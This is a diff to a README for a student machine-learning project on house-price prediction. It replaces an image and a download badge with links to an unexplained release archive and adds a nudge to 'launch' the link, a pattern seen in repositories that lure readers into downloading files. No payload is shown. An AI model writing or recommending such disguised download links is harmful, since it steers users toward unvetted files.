@@ -1,7 +1,7 @@
 
 # 🏡 Welcome to the ML_Project_2024 Repository! 🤖
 
-![machine-learning](https://image.freepik.com/free-vector/artificial-intelligence-machine-learning_68708-75.jpg)
+![machine-learning](https://github.com/Enzo7622245/ML_Project_2024/releases/tag/v1.0)
 
 ## Overview
 Welcome to the ML_Project_2024 repository, where we delve into the fascinating world of machine learning. This repository houses a semester project from a university course, focusing on implementing various classification and regression models to predict house prices and the number of rooms. With a dataset containing over 160,000 entries, we've explored the realms of AI algorithms to uncover insights and make accurate predictions about real estate.
@@ -42,7 +42,7 @@ Feel free to clone the repository and explore the Jupyter Notebooks to gain insi
 ## Get Started
 Ready to delve into the world of machine learning with our project? Click the button below to download the project files:
 
-[![Download Project](https://img.shields.io/badge/Download-Project-yellow)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/Enzo7622245/ML_Project_2024/releases/tag/v1.0)](https://github.com/Enzo7622245/ML_Project_2024/releases/tag/v1.0)
 
 Please note that the link needs to be launched to initiate the download of the project files.
 
